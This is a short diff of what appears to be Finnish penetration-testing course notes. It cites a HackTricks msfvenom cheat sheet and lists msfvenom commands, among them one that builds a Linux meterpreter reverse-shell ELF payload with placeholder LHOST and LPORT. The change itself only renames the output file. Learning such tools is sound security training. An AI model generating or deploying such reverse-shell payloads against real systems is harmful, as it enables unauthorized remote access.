@@ -33,7 +33,7 @@ Santos et al 2017: Security Penetration Testing - The Art of Hacking Series Live
 Polop et al 2024: HackTricks: MSFVenom - CheatSheet [https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom)
 
 - Listaa payloadit: ``msfvenom -l payloads``
-- Reverse shell payload ``msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > pay.elf``
+- Reverse shell payload ``msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf``
 
 
 ## a) Asenna Hashcat ja testaa sen toiminta murtamalla esimerkkisalasana
